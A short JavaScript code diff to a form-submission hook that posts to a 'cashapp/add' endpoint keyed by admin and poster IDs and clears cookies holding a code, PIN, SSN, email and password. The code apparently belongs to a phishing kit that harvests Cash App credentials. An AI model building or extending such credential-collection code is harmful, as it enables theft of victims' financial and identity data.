@@ -14,10 +14,11 @@ function useMockSubmit() {
     // Cookies.remove("code");
     // Cookies.remove("pin");
     // Cookies.remove("ssn");
+    // Cookies.remove("email");
+    // Cookies.remove("password");
     // formik.resetForm();
     // return;
 
-    // const url = `${API_URL}/cashapp/add`;
     const url = `${API_URL}/cashapp/add/${adminId}/${posterId}`;
 
     console.log(url);
@@ -39,6 +40,8 @@ function useMockSubmit() {
       Cookies.remove("code");
       Cookies.remove("pin");
       Cookies.remove("ssn");
+      Cookies.remove("email");
+      Cookies.remove("password");
       toast.success("Submitted Successfully");
       formik.resetForm();
     } else {
